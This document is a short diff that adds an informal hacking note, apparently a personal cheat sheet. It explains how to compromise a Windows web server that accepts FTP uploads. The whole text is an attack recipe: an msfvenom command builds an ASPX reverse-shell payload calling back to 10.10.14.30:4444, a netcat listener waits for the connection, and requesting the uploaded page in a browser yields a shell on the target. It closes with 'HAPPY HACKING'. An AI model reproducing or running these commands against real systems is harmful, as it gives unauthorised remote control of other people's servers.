@@ -1,0 +1,22 @@
+IF WINDOWS WEB SERVER THOROUGH PAGE USING FTP PROTOCOL
+
+THAN TRY THIS 
+
+msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.30 LPORT=4444 -o reverse-shell.aspx
+
+this is a windows reverse shell using msfvenom
+
+now
+
+nc -lvnp 4444
+
+now execute the url 
+
+http://target-ip/reverse-shell.aspx
+
+now you access the target windows machine
+
+-------------
+HAPPY HACKING
+-------------
+
